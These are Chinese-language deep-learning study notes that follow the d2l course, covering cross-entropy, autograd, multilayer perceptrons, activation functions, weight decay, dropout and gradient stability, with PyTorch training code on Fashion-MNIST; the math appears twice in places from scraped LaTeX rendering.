\\sum_{i=1}^n P(x_i) log\\frac{P(x_i)}{Q(x_i)}DKL​(P∣∣Q)=−∑i=1n​P(xi​)logQ(xi​)−(−∑i=1n​P(xi​)logP(xi​))=∑i=1n​P(xi​)logQ(xi​)P(xi​)​ KL散度具有如下两个性质： 不对称性，DKL(P∣∣Q)≠DKL(Q∣∣P)D_{KL}(P||Q) \\neq D_{KL}(Q||P)DKL​(P∣∣Q)=DKL​(Q∣∣P) $KL \\geq 0 始终成立，当且仅当始终成立，当且仅当始终成立，当且仅当P(X) = Q(X)时时时KL = 0$ 交叉熵 交叉熵与KL散度密切相关，我们将上述KL散度公式换一种写法： DKL(P∣∣Q)=−∑i=1nP(xi)logQ(xi)−(−∑i=1nP(xi)logP(xi))=∑i=1nP(xi)logP(xi)Q(xi)=−H(P(X))−∑i=1nP(xi)logQ(xi)D_{KL}(P || Q) = -\\sum_{i=1}^nP(x_i)logQ(x_i) - (-\\sum _{i=1}^nP(x_i)logP(x_i)) \\\\ = \\sum_{i=1}^n P(x_i) log\\frac{P(x_i)}{Q(x_i)} = -H(P(X)) - \\sum_{i=1}^nP(x_i)logQ(x_i)DKL​(P∣∣Q)=−∑i=1n​P(xi​)logQ(xi​)−(−∑i=1n​P(xi​)logP(xi​))=∑i=1n​P(xi​)logQ(xi​)P(xi​)​=−H(P(X))−∑i=1n​P(xi​)logQ(xi​) 交叉熵被定义为 H(P,Q)=H(P)+DKL(P∣∣Q)=−∑i−1nP(xi)logQ(xi)H(P,Q) = H(P)+D_{KL}(P||Q) = -\\sum_{i-1}^nP(x_i)logQ(x_i)H(P,Q)=H(P)+DKL​(P∣∣Q)=−∑i−1n​P(xi​)logQ(xi​) 也就是KL散度公式的右半部分（带负号） 当我们考虑用于拟合真实分布的Q分布时，P分布相当于一个确定的分布，那么KL散度的左半−H(P(X))-H(P(X))−H(P(X))可以认为是固定值 那么我们可以将神经网络视为Q，那么神经网络的目的就是通过训练使近似分布Q逼近真实分布P 那么优化KL散度和优化交叉熵实际上是等效的，因此在机器学习上我们通常选择优化计算量更少的交叉熵。 交叉熵损失函数 而在实际应用中，我们将整个模型看作是对真实分布中的一次拟合，那么对于单个样本，假设真实分布为y，网络输出分布为y^\\hat yy^​，总的类别数为n，则交叉熵损失函数的计算方式如下： Loss=−∑i=1nyilog(y^i)Loss = -\\sum_{i=1}^ny_i log(\\hat y_i)Loss=−∑i=1n​yi​log(y^​i​) 对一个batch，单标签n分类任务的交叉熵损失函数的计算方法为： Loss=−∑j=1batch_size∑i=1nyjilog(y^ji)Loss = -\\sum_{j=1} ^ {batch \\_ size}\\sum_{i=1}^ny_{ji} log(\\hat y_{ji})Loss=−∑j=1batch_size​∑i=1n​yji​log(y^​ji​) 自动求导 列对行求导： 求导 标量(1,) 向量(n,1) 矩阵(n,k) 标量(1,) 标量(1,) 行向量(1,n) 矩阵(k,n) 向量(m,1) 列向量(m,1) 矩阵(m,n) 张量(m,k,n) 矩阵(m,l) 矩阵(m,l) 张量(m,l,n) 张量 (m,l,k,n) 标量对向量求导 标量关于列向量的导数为行向量 | y | a | au | sum(x) | ∣∣x∣∣2||x||^2∣∣x∣∣2 | | --------------------------------- | ----------- | ----------------------------------- | ----------- | ------------ | | δyδX⃗\\frac{\\delta y}{\\delta \\vec{X}}δXδy​ | 0⃗T\\vec{0}^T0T | aδuδX⃗a\\frac{\\delta u}{\\delta{\\vec{X}}}aδXδu​ | 1⃗T\\vec{1}^T1T | 2X⃗T2\\vec{X}^T2XT | y u + v uv &lt;u⃗,v⃗&gt;&lt;\\vec{u},\\vec{v}&gt;&lt;u,v&gt; δyδX⃗\\frac{\\delta y}{\\delta \\vec{X}}δXδy​ δuδX⃗+δvδX⃗\\frac{\\delta u}{\\delta \\vec{X}} + \\frac{\\delta v}{\\delta \\vec{X}}δXδu​+δXδv​ δuδX⃗v+δvδX⃗u\\frac{\\delta u}{\\delta \\vec{X}} v + \\frac{\\delta v}{\\delta \\vec{X}} uδXδu​v+δXδv​u u⃗TδuδX⃗+v⃗TδvδX⃗\\vec{u}^T \\frac{\\delta u}{\\delta \\vec{X}} + \\vec{v}^T\\frac{\\delta v}{\\delta \\vec{X}}uTδXδu​+vTδXδv​ 向量对标量求导 列向量对标量的导数为列向量 向量对向量求导 分类 自动求导分为两类: 符号求导 数值求导 通过竖直拟合导数： 计算图 将代码分解为操作子 将计算表示为一个无环图 计算图构造方式有两种： 显示构造 隐式构造 其中Tensorflow和Theano需要显示构造 而PyTorch是隐式构造 MXNet两种方式都支持。 显示构造如下所示，直接列出公式即可： 隐式构造需要告知代码记住梯度： 根据链式法则，自动求导抱恨两种方式：正向以及反向： 在计算图上，正向和反向计算的过程如下所示： 因此反向累积的过程如下： 为什么使用反向而不是正向传播 多层感知机 线性模型的缺陷 线性意味着单调假设： 任何特征的增大都会导致模型输出增大（权重为正时，或减小（权重为负时 这对于部分具有线性特征的事件： 例如收入与还款概率 或可以使用线性来代替的事件： 例如根据体温预测死亡率可以使用与37摄氏度的距离作为特征 但我们生活中还有很多非线性的事件： 例如对猫狗的图片进行分类时，某个位置像素的强度无法增加图像描绘猫/狗的相似度。 但是进一步思考，为什么这样的线性关系不存在呢： 因为任何像素的重要性都以复杂的方式取决于该像素的上下文（周围像素的值） 为此，我们需要找到一种可以考虑特征之间的相关交互作用的表示方法。 在深度神经网络中，我们使用观测数据来联合学习隐藏层表示和应用与该表示的线性预测器。 多层感知机 可以通过在线性网络中加入一个或多个隐藏层来克服线性模型的限制，使其能处理更普遍的函数关系类型 我们将许多全连接层堆叠在一起，每一层都输出到上面的层，直到生成最后的输出 我们可以把前L−1层看作表示，把最后一层看作线性预测器。 这种架构通常称为多层感知机（multilayer perceptron），通常缩写为MLP。 但如果我们只给隐藏层的各个单元设置权重和偏置，假设为W(1),b(1)W^{(1)}, b^{(1)}W(1),b(1)，而输出层的权重和偏置为W(2),b(2)W^{(2)},b^{(2)}W(2),b(2)，那么整个网络可以表示为： H=XW(1)+b(1)H = XW^{(1)} + b^{(1)}H=XW(1)+b(1) O=HW(2)+b(2)O = HW^{(2)} + b^{(2)}O=HW(2)+b(2) H表示隐藏层输出，O表示感知机的输出。 可见以上两式可以通过带入法，求得W和b的结合式： W=W(1)W(2)W = W^{(1)}W^{(2)}W=W(1)W(2) b=b(1)W(2)+b(2)b = b^{(1)}W^{(2)} +b^{(2)}b=b(1)W(2)+b(2) 那么我们就可以只有单层的模型来替换这个模型。那这个模型又有什么意义呢？ 于是为了发挥多层架构的潜力，我们需要一个额外的参数：在放射变换后对每个隐藏单元应用非线性的激活函数（activation function）σ\\sigmaσ 于是代表模型的函数终于变为了非线性： H=σ(XW(1)+b(1))H = \\sigma (XW^{(1)} + b^{(1)})H=σ(XW(1)+b(1)) O=HW(2)+b(2)O = HW^{(2)} + b^{(2)}O=HW(2)+b(2) 激活函数 激活函数（activation function）通过计算加权和并加上偏置来确定神经元是否应该被激活， 它们将输入信号转换为输出的可微运算。 大多数激活函数都是非线性的。 下面介绍一下常见的激活函数 ReLu 修正线性单元Relu(Rectified linear unit)，对于给定元素x，ReLu被定义为该元素与0的最大值： ReLu(x)=max(x,0)ReLu(x) = max(x,0)ReLu(x)=max(x,0) 下面我们尝试使用PyTorch绘制Relu的图像： 123456789import torchfrom d2l import torch as d2lx = torch.arange(-8.0, 8.0, 0.1, requires_grad=True)y = torch.relu(x)d2l.plot(x.detach(), y.detach(), &#x27;x&#x27;, &#x27;relu(x)&#x27;, figsize=(5, 2.5))d2l.plt.show() 可见ReLu是一个分段函数。 当输入为负时，ReLU函数的导数为0，而当输入为正时，ReLU函数的导数为1。 注意，当输入值精确等于0时，ReLU函数不可导。 在此时，我们默认使用左侧的导数，即当输入为0时导数为0。 我们可以忽略这种情况，因为输入可能永远都不会是0。 我们来绘制一下ReLu函数的导函数： 12345678910import torchfrom d2l import torch as d2lx = torch.arange(-8.0, 8.0, 0.1, requires_grad=True)y = torch.relu(x)y.backward(torch.ones_like(x), retain_graph=True)d2l.plot(x.detach(), x.grad, &#x27;x&#x27;, &#x27;grad of relu&#x27;, figsize=(5, 2.5))d2l.plt.show() 关于backwards中的参数的解释，可以从如下文章中得到答案： 算力表https://blog.csdn.net/sinat_28731575/article/details/90342082 此外，ReLU函数还有许多变体，包括参数化ReLU函数，该变体为ReLU添加一个线性项，因此即使参数为负数，某些信息仍然可以通过： pReLU(x)=max(0,x)+αmin(0,x)pReLU(x) = max(0,x) + \\alpha min(0,x)pReLU(x)=max(0,x)+αmin(0,x) 优缺点 优点： 1). 使用 ReLU 的 SGD 算法的收敛速度比 sigmoid 和 tanh 快； 2.) 在 x &gt; 0 上，不会出现梯度饱和，梯度消失的问题。 3.) 计算复杂度低，不需要进行指数运算，只要一个阈值（0）就可以得到激活值。 缺点： 1.) ReLU 的输出不是 0 均值的，它将小于 0 的值都置为 0; 使得所有参数的更新方 向都相同，导致了 ZigZag 现象。 2.) Dead ReLU Problem (ReLU 神经元坏死现象)：某些神经元可能永远不被激活， 导致相应参数永远不会被更新(在负数部分，梯度为 0) 3.) ReLU 不会对数据做幅度压缩，所以数据的幅度会随着模型层数的增加不断扩 张。 注： ZigZag 现象指的是，模型中所有的参数在一次梯度更新的过程中，更新方向相 同，即同为正或者同为负。这就导致了梯度更新图像呈现 Z 字形，进而导致梯度更新 效率比较低。 Sigmoid函数 对于一个定义域在R中的输入， sigmoid函数将输入变换为区间(0, 1)上的输出。 因此，sigmoid通常称为挤压函数（squashing function）： 它将范围（-inf, inf）中的任意输入压缩到区间（0, 1）中的某个值： sigmoid(x)=11+exp(−x)sigmoid(x) = \\frac {1} {1 + exp(-x)}sigmoid(x)=1+exp(−x)1​ sigmoid函数可以视为softmax函数的特例，下面我们来绘制该函数： 123456789import torchfrom d2l import torch as d2lx = torch.arange(-8.0, 8.0, 0.1, requires_grad=True)y = torch.sigmoid(x)d2l.plot(x.detach(), y.detach(), &#x27;x&#x27;, &#x27;sigmoid(x)&#x27;, figsize=(5, 2.5))d2l.plt.show() 下面我门来看看该函数的导数： ddxsigmoid(x)=exp(−x)(1+exp(−x))2=sigmoid(x)(1−sigmoid(x))\\frac{d}{dx}sigmoid(x) = \\frac{exp(-x)}{(1 + exp(-x))^2} = sigmoid(x)(1 - sigmoid(x))dxd​sigmoid(x)=(1+exp(−x))2exp(−x)​=sigmoid(x)(1−sigmoid(x)) 下面我们利用pytorch的反向传播机制来绘制sigmoid的导数图像，需要注意的是，当输入为0时，sigmoid函数的导数达到最大值0.25，而输入在任意方向上越远离0，导数就越接近于0： 12345678910import torchfrom d2l import torch as d2lx = torch.arange(-8.0, 8.0, 0.1, requires_grad=True)y = torch.sigmoid(x)y.backward(torch.ones_like(x), retain_graph=True)d2l.plot(x.detach(), x.grad, &#x27;x&#x27;, &#x27;grad of sigmoid&#x27;, figsize=(5, 2.5))d2l.plt.show() tanh函数 与sigmoid函数类似， tanh(双曲正切)函数也能将其输入压缩转换到区间(-1, 1)上。 tanh函数的公式如下： tanh(x)=1−exp(−2x)1+exp(−2x)tanh(x) = \\frac {1 - exp(-2x)}{1 + exp(-2x)}tanh(x)=1+exp(−2x)1−exp(−2x)​ 下面我们绘制tanh函数。 注意，当输入在0附近时，tanh函数接近线性变换。 函数的形状类似于sigmoid函数， 不同的是tanh函数关于坐标系原点中心对称。 123456789import torchfrom d2l import torch as d2lx = torch.arange(-8.0, 8.0, 0.1, requires_grad=True)y = torch.tanh(x)d2l.plot(x.detach(), y.detach(), &#x27;x&#x27;, &#x27;relu(x)&#x27;, figsize=(5, 2.5))d2l.plt.show() 以及该函数的导数： ddxtanh(x)=1−tanh2\\frac{d}{dx}tanh(x) = 1 - tanh^2dxd​tanh(x)=1−tanh2 当输入接近0时，tanh函数的导数接近最大值1。 与我们在sigmoid函数图像中看到的类似， 输入在任一方向上越远离0点，导数越接近0。 12345678import torchfrom d2l import torch as d2lx = torch.arange(-8.0, 8.0, 0.1, requires_grad=True)y = torch.tanh(x)y.backward(torch.ones_like(x), retain_graph=True)d2l.plot(x.detach(), x.grad, &#x27;x&#x27;, &#x27;grad of relu&#x27;, figsize=(5, 2.5))d2l.plt.show() 多层感知机实现 数据 我们继续使用Fashion_MNIST图像分类数据集进行实验，首先我们获取数据集： 12345678import torchfrom torch import nnfrom d2l import torch as d2l&quot;&quot;&quot;获取数据&quot;&quot;&quot;batch_size = 256train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size) 参数 我们再次将图像展平作为特征，并设置输出层为10层，对于隐藏层和输出层的参数，我们为其设置维度： 12345678910111213141516171819202122&quot;&quot;&quot;准备参数&quot;&quot;&quot;# 输出为784维的特征，输出为10项的类别，隐藏层中神经元的个数设置为256num_inputs, num_outputs, num_hiddens = 784, 10, 256# W1为隐藏层权重，784 * 256维W1 = nn.Parameter(torch.randn( num_inputs, num_hiddens, requires_grad=True) * 0.01)# b1为隐藏层偏置值，为隐藏层神经元个数256b1 = nn.Parameter(torch.zeros(num_hiddens, requires_grad=True))# W2为输出层权重，256 * 10维W2 = nn.Parameter(torch.randn( num_hiddens, num_outputs, requires_grad=True) * 0.01)# b2为输出层偏置值，为类别个数10b2 = nn.Parameter(torch.zeros(num_outputs, requires_grad=True))params = [W1, b1, W2, b2] 激活函数 然后为隐藏层设置激活函数： 123456&quot;&quot;&quot;激活函数&quot;&quot;&quot;def relu(x): a = torch.zeros_like(x) return torch.max(x, a) 模型 定义模型： 123456&quot;&quot;&quot;模型&quot;&quot;&quot;def net(x): x = x.reshape((-1, num_inputs)) H = relu(x@W1 + b1) # @代表矩阵乘法 return (H@W2 + b2) 损失函数 定义损失函数： 123&quot;&quot;&quot;损失函数&quot;&quot;&quot;loss = nn.CrossEntropyLoss(reduction=&#x27;none&#x27;) 训练 模型训练与预测： 123456789&quot;&quot;&quot;训练&quot;&quot;&quot;num_epochs, lr = 10, 0.1updater = torch.optim.SGD(params, lr=lr)d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, updater)d2l.predict_ch3(net, test_iter)d2l.plt.show() 结果 最终得到模型精度和损失曲线： 和预测结果： 多层感知机API实现 定义模型 使用torch.nn.Sequential定义层级： 1234567# TODO:定义模型net = nn.Sequential( nn.Flatten(), nn.Linear(28*28, 256), nn.ReLU(), nn.Linear(256, 10),) 初始化权重 定义权重初始化回调函数： 123456789101112# TODO:初始化权重def init_Weights(m): if type(m) == nn.Linear: nn.init.normal_(m.weight, std=0.01) net.apply(init_Weights) 获取数据并训练 12345678# TODO:获取数据batch_size, lr, num_epochs = 256, 0.1, 10train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size)loss = nn.CrossEntropyLoss(reduction=&#x27;none&#x27;)trainer = torch.optim.SGD(net.parameters(), lr=lr)d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, trainer)d2l.predict_ch3(net, test_iter) 模型选择 误差 训练误差 模型在训练数据集上计算得到的误差 泛化误差 模型应用在同样从原石样本的分布中抽取的无限多数据样本时，模型误差的期望 模型复杂性 模型容量指： 拟合各种函数的能力 低容量的模型难以拟合训练数据 高容量的模型可以记住所有的训练数据 具有更多参数的模型可能被认为更复杂， 参数有更大取值范围的模型可能更为复杂。 通常对于神经网络，我们认为需要更多训练迭代的模型比较复杂， 而需要“早停”（early stopping）的模型（即较少训练迭代周期）就不那么复杂。 下面介绍几个倾向于影响模型泛化的因素： 可调整参数的数量。当可调整参数的数量（有时称为自由度）很大时，模型往往更容易过拟合。 参数采用的值。当权重的取值范围较大时，模型可能更容易过拟合。 训练样本的数量。即使你的模型很简单，也很容易过拟合只包含一两个样本的数据集。而过拟合一个有数百万个样本的数据集则需要一个极其灵活的模型。 数据复杂性 衡量数据复杂度的重要因素有： 样本个数 每个样本的元素个数（特征） 时间、空间结构 多样性 模型选择 模型容量\\数据 简单 复杂 低 正常 欠拟合 高 过拟合 正常 在机器学习中，我们通常在评估几个候选模型后选择最终的模型。 这个过程叫做模型选择。 有时，需要进行比较的模型在本质上是完全不同的（比如，决策树与线性模型）。 又有时，我们需要比较不同的超参数设置下的同一类模型。 验证集 实际情况下，为了避免让模型出现过拟合的情况，我们通常不能依靠测试数据进行模型选择，然而我们不能仅仅依靠训练数据来进行模型选择，因为我们无法估计训练数据的泛化误差。 解决该问题常见的作法是将数据分为三份，除了训练集和测试集以外，再增加一个验证数据集(validation dataset)。 K-折交叉验证 当训练数据稀缺时，我们甚至可能无法提供足够的数据来构成一个合适的验证集。 这个问题的一个流行的解决方案是采用K折交叉验证。 这里，原始训练数据被分成K个不重叠的子集。 然后执行K次模型训练和验证，每次在K−1个子集上进行训练， 并在剩余的一个子集（在该轮中没有用于训练的子集 ）上进行验证。 最后，通过对K次实验的结果取平均来估计训练和验证误差。 欠拟合和过拟合 欠拟合 训练误差和验证误差都很严重，但他们之间仅有一点差距时，如果模型不能降低训练误差，可能意味着模型过于简单（即表达能力不足），无法捕获试图学习的模式，此外由于我们的训练和验证误差之间的泛化误差很小，我们有理由相信可以用一个更复杂的模型降低训练误差，这种现象被称为欠拟合(underfitting)] 过拟合 当我们的训练误差明显地狱验证误差是，表明了严重的过拟合(iverfitting)，但对于深度学习领域，最好的训练模型在训练数据上的表现往往比在验证集（或测试集）上好得多。最终我们通常更关心验证误差，而不是训练误差和验证误差之间的差距。 权重衰退(Weight decay) 一种常用的处理过拟合的方法 上节讲到，我们可以通过控制参数的取值范围和数量来控制模型容量 使用均方范式作为硬性优化 例如最小化随时函数时，限制W的取值范围 min Loss(W⃗,b) subject to ∣∣W⃗∣∣2≤θmin\\ Loss(\\vec{W}, b) \\ subject \\ to \\ ||\\vec{W}||^2 \\leq \\thetamin Loss(W,b) subject to ∣∣W∣∣2≤θ 但是通常不会限制偏移量b（因为效果差不多） 小的θ\\thetaθ意味着更强的正则项 使用均方范式作为柔性优化 这种方式更为常用，因为优化起来比硬性优化更方便 对每个$\\theta ，都可以找到，都可以找到，都可以找到\\lambda $使得之前的目标函数等价于下面形式： min Loss(W⃗,b)+λ2∣∣W⃗∣∣2min\\ Loss(\\vec{W}, b) + \\frac{\\lambda}{2}||\\vec{W}||^2min Loss(W,b)+2λ​∣∣W∣∣2 可以通过拉格朗日乘子来证明 超参数λ\\lambdaλ控制了正则项的重要程度 λ=0\\lambda = 0λ=0：无作用 λ→∞,W⃗∗→0\\lambda \\to \\infty, \\vec{W}^{*} \\to 0λ→∞,W∗→0其中W*表示W的最优解 参数更新法则 计算梯度 δδW⃗(Loss(W⃗,b)+λ2∣∣W⃗∣∣2)=δLoss(W⃗,b)δW⃗+λW⃗\\frac{\\delta}{\\delta \\vec{W}} (Loss(\\vec{W}, b) + \\frac{\\lambda}{2}||\\vec{W}||^2) = \\frac{\\delta Loss(\\vec{W}, b)}{\\delta \\vec{W}} + \\lambda \\vec{W}δWδ​(Loss(W,b)+2λ​∣∣W∣∣2)=δWδLoss(W,b)​+λW 时间t更新参数 W⃗t+1=W⃗t−ηδδW⃗t(Loss(W⃗t,bt)+λ2∣∣W⃗t∣∣2)\\vec{W}_{t + 1} = \\vec{W}_{t} - \\eta \\frac{\\delta}{\\delta \\vec{W}_t} (Loss(\\vec{W}_t, b_t) + \\frac{\\lambda}{2}||\\vec{W}_t||^2)Wt+1​=Wt​−ηδWt​δ​(Loss(Wt​,bt​)+2λ​∣∣Wt​∣∣2) 将上式带入得： W⃗t+1=(1−ηλ)W⃗t−ηδLoss(W⃗t,bt)δW⃗t\\vec{W}_{t + 1} = (1 - \\eta \\lambda)\\vec{W}_t - \\eta \\frac{\\delta Loss(\\vec{W}_t, b_t)}{\\delta \\vec{W}_t}Wt+1​=(1−ηλ)Wt​−ηδWt​δLoss(Wt​,bt​)​ 通常ηλ&lt;1\\eta \\lambda &lt; 1ηλ&lt;1，在深度学习种通常叫权重衰退 总结 权重衰退通过L2正则项使得模型参数不会过大，从而控制模型复杂度 正则权重是控制模型复杂度的超参数 丢弃法（Dropout） 动机 一个好的模型需要对输入数据的扰动鲁棒 使用有噪音的数据等价于Tikhonov正则 丢弃法：在层间加入噪音 无偏差噪音 对于XXX加入噪音X′X&#x27;X′，我们希望 E[X′]=XE[X&#x27;] = XE[X′]=X 即增加噪声后，其期望仍然是原值 丢弃法则是通过如下的方式保证这一条件的： xi′={0with probability pxi1−potherwisex_i&#x27; = \\begin{cases} 0 &amp; with \\ probability \\ p \\\\ \\frac{x_i}{1-p} &amp; otherwise \\end{cases}xi′​={01−pxi​​​with probability potherwise​ 显然计算xi′x_i&#x27;xi′​的期望得到的值是xxx Dropout的使用 通常将Dropout作用在隐藏层的输出上，直观来看就是将隐藏层中的某些神经元去掉了： Dropout相当于一个正则项，指在训练时使用，推理过程并不适用。这样保证了输出的确定性 总结 丢弃法将一些输出项随机置0来控制模型复杂度 常用在多层感知机的隐藏层输出上 丢弃概率P时控制模型复杂度的超参数（常用0.5、0.9、0.1） 实验 首先我们手动的实现一下Dropout算法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import mathimport numpy as npimport torchfrom torch import nnfrom d2l import torch as d2ldef dropout_layer(X, dropout): &quot;&quot;&quot;dropout layer Args: X (Tensor): 某一层的输出 dropout (float): dropout的概率p Returns: Tensor: dropout后的输出，丢弃的为0，未丢弃的进行了缩放即除以(1-p) &quot;&quot;&quot; assert 0 &lt;= dropout &lt;= 1 if dropout == 1: return torch.zeros_like(X) if dropout == 0: return X # 制造一个滤波随机生成一个值为0，1间均匀随机分布的张量 # 大于dropout的取1，小于取0 mask = (torch.rand(X.shape) &gt; dropout).float() # 不使用Numpy中X[mask] = 0的方式来选择是因为对GPU而言直接乘法比选择快 return mask * X / (1.0 - dropout)# 定义模型num_input, num_output, num_hidden1, num_hidden2 = 784, 10, 256, 256dropout1, dropout2 = 0.2, 0.5class Net(nn.Module): def __init__(self, num_input, num_output, num_hidden1, num_hidden2, is_training=True): super(Net, self).__init__() self.is_training = is_training self.num_input = num_input self.lin1 = nn.Linear(num_input, num_hidden1) self.lin2 = nn.Linear(num_hidden1, num_hidden2) self.lin3 = nn.Linear(num_hidden2, num_output) self.relu = nn.ReLU() def forward(self, X): H1 = self.relu(self.lin1(X.reshape((-1, self.num_input)))) # 训练时使用dropout if self.is_training: H1 = dropout_layer(H1, dropout1) H2 = self.relu(self.lin2(H1)) if self.is_training: H2 = dropout_layer(H2, dropout2) out = self.lin3(H2) return outnet = Net(num_input, num_output, num_hidden1, num_hidden2)# 训练num_epochs, lr, batch_size = 10, 0.5, 256loss = nn.CrossEntropyLoss(reduction=&#x27;none&#x27;)train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size)trainer = torch.optim.SGD(net.parameters(), lr=lr)d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, trainer)d2l.plt.show() 上述代码上我们使用两个256个神经元的隐藏层来拟合一个较为简单的数据集，模型复杂而数据集简单，容易出现过拟合。因此使用Dropout的效果还是很明显的： 然后我们将p设为0看看不采用Dropout训练的结果： 可见在测试集上的误差相较于图1有些许下降 使用PyTorch提供的API实现也会得到类似的结果： 1234567891011121314151617181920212223242526272829# 简洁实现# 模型定义net = nn.Sequential( nn.Flatten(), nn.Linear(num_input, num_hidden1), nn.ReLU(), nn.Dropout(dropout1), nn.Linear(num_hidden1, num_hidden1), nn.ReLU(), nn.Dropout(dropout2), nn.Linear(num_hidden2, num_output))def init_weights(m): if type(m) == nn.Linear: nn.init.normal_(m.weight, std=0.01)net.apply(init_weights)# 训练num_epochs, lr, batch_size = 10, 0.5, 256loss = nn.CrossEntropyLoss(reduction=&#x27;none&#x27;)train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size)trainer = torch.optim.SGD(net.parameters(), lr=lr)d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, trainer)d2l.plt.show() 数值稳定性和模型初始化 糟糕的初始化选择可能会导致我们在训练时遇到梯度爆炸或者梯度消失。 对于神经网络的梯度，我们考虑如下d层的神经网络 ht=ft(ht−1) and y=l(fd(fd−1(...f1(x)))h^t = f_t(h^{t-1}) \\ and \\ y = l (f_d(f_{d-1}(...f_1(x)))ht=ft​(ht−1) and y=l(fd​(fd−1​(...f1​(x))) 其中y为网络的损失，x为网络的输入，t为网络的第t层，hih_ihi​为第i个隐藏层，每一个隐藏层由变换ftf_tft​定义，每一层的权重为WtW_tWt​，那么我们计算损失l关于参数WtW_tWt​的梯度： δlδWt=δlδhdδhdδhd−1...δht+1δhtδhtδWt\\frac{\\delta{l}}{\\delta W^t} = \\frac{\\delta l}{\\delta h^d} \\frac{\\delta h^d}{\\delta h^{d-1}}...\\frac{\\delta{h^{t+1}}}{\\delta h^t}\\frac{\\delta{h^{t}}}{\\delta W^t}δWtδl​=δhdδl​δhd−1δhd​...δhtδht+1​δWtδht​ 此处为了计算方便省去了偏置项，可见最终的结果是一个d-t次的矩阵乘法。 其中δhtδht−1\\frac{\\delta h^t}{\\delta h^{t-1}}δht−1δht​是一个矩阵，为什么呢，我们来将他展开： ht=ft(ht−1)=σ(Wtht−1)h^t = f_t(h^{t-1}) = \\sigma (W_th^{t-1})ht=ft​(ht−1)=σ(Wt​ht−1) 我们对ht−1h^{t-1}ht−1求导: δδht−1σ(Wtht−1)=δδWtht−1σ(Wtht−1)∗δδht−1(Wtht−1)\\frac{\\delta }{\\delta h^{t-1}} \\sigma (W_th^{t-1}) = \\frac{\\delta }{\\delta W_th^{t-1}} \\sigma (W_th^{t-1}) * \\frac{\\delta }{\\delta h^{t-1}} (W_th^{t-1})δht−1δ​σ(Wt​ht−1)=δWt​ht−1δ​σ(Wt​ht−1)∗δht−1δ​(Wt​ht−1) 其中δδWtht−1σ(Wtht−1)\\frac{\\delta }{\\delta W_th^{t-1}} \\sigma (W_th^{t-1})δWt​ht−1δ​σ(Wt​ht−1)我们可以看作是δδX⃗F(X⃗)\\frac{\\delta }{\\delta \\vec{X}} F(\\vec{X})δXδ​F(X) 而F(X⃗)F(\\vec{X})F(X)实际上就是对X⃗\\vec{X}X中的每一项求F(xi)F(x_i)F(xi​)，得到一个向量Y⃗\\vec{Y}Y，而对向量X⃗\\vec{X}X求导，则是将Y⃗\\vec{Y}Y的每一个分量对X⃗\\vec{X}X的每一个分量求导。因此只有在行和列相等的时候求导值才不为0。即一个对角矩阵，所以最终求导的结果如下： δδht−1σ(Wtht−1)=diag(σ′(Wtht−1))(Wt)T\\frac{\\delta }{\\delta h^{t-1}} \\sigma (W_th^{t-1}) = diag(\\sigma &#x27;(W^th^{t-1}))(W^t)^Tδht−1δ​σ(Wt​ht−1)=diag(σ′(Wtht−1))(Wt)T 因此在处理概率时容易受到数值下溢的影响。 处理概率时，一个很常见的技巧是切换到对数空间，即将数值表示的压力从尾数转移到指数。 但实际上这样处理会导致原本矩阵中表示的各种各样的特征值发生变化。 不稳定梯度带来的风险不止在于数值表示； 不稳定梯度也威胁到我们优化算法的稳定性。 梯度消失将会带来以下危害： 梯度值变为0 对16位浮点数尤为严重 训练没有进展 不管如何选择学习率 对底部层尤为严重， 仅仅对顶部层训练效果较好 无法让神经网络更深 梯度消失 参数更新过小，在每次更新时几乎不会移动，导致模型无法学习 例如我们常用的sigmoid函数： sigmoid(x)=11+e−xsigmoid(x) = \\frac{1}{1 + e^{-x}}sigmoid(x)=1+e−x1​ 它是导致梯度消失问题的常见愿意，我们来进行如下实验： 1234567891011import torchfrom d2l import torch as d2lx = torch.arange(-8.0, 8.0, 1.0, requires_grad=True)y = torch.sigmoid(x)y.backward(torch.ones_like(x))d2l.plot(x.detach().numpy(), [y.detach().numpy(), x.grad.numpy()], legend=[ &#x27;sigmoid&#x27;, &#x27;gradient&#x27;], figsize=(4.5, 2.5))d2l.plt.show() 我们将Sigmoid函数和他的导数输出： 可见当函数的输入喊打活很小时，梯度接近0，非常小。 当反向传播通过许多层时，除非我们在刚刚好的地方， 这些地方sigmoid函数的输入接近于零，否则整个乘积的梯度可能会消失 梯度爆炸 参数更新过大，破坏了模型的稳定收敛 例如我们使用ReLU作为激活函数： 那么diag(σ′(Wtht−1))diag(\\sigma &#x27;(W^th^{t-1}))diag(σ′(Wtht−1))中的值不是0就是1，因此最终结果δlδWt\\frac{\\delta{l}}{\\delta W^t}δWtδl​中的值完全来自于(Wt)T(W^t)^T(Wt)T，也就意味着如果d-t很大（即网络比较深），值也会很大。 这将会导致： 值超出值域 特别是对于16位浮点数（[6e−5,6e4][6e^{-5}, 6e^4][6e−5,6e4]）（因为目前INVIDIA的显卡处理16位浮点数的运算要比32位快2倍，因此通常使用16位浮点数） 对学习率敏感 如果学习率过大，将会带来较大的参数值，将会带来更大的梯度 如果学习率过小，训练可能无法进展 让训练更稳定 因此我们最终需要做的是让训练更稳定，也就是让梯度的变化在一个可控的范围内例如让梯度在[1e−6,1e3][1e^{-6},1e^3][1e−6,1e3] 常用的方法有： 为了解决连乘导致的值过大和值过小的问题，可以将乘法变成加法 该方法在ResNet和LSTM中经常使用 归一化 梯度归一化（即将过大或过小的梯度映射到0，1的区间） 梯度裁剪（即将超过某一阈值的梯度强行设置为阈值） 进行合理的权重初始化和选择激活函数 下面我们来着重学习一些进行合理的权重初始化和选择激活函数的方法 让每层的方差是一个常数 为了做到这一点，我们可以： 将每层的输出和梯度都看作随机变量 让它们的均值和方差都保持一致 例如： 对于正向传播，我们将每一层的输出看作是一个随机向量，并控制随机向量的均值与方差相同： E[hit]=0,Var[hit]=aE[h_i^{t}] = 0,Var[h_i^t] = aE[hit​]=0,Var[hit​]=a 而对于反向传递，我们梯度视为随机向量，并控制随机向量的均值与方差相同： E[δlδhit]=0,Var[δlδhit]=bE[\\frac{\\delta l}{\\delta h_i^t}]=0,Var[\\frac{\\delta l}{\\delta h_i^t}] =bE[δhit​δl​]=0,Var[δhit​δl​]=b 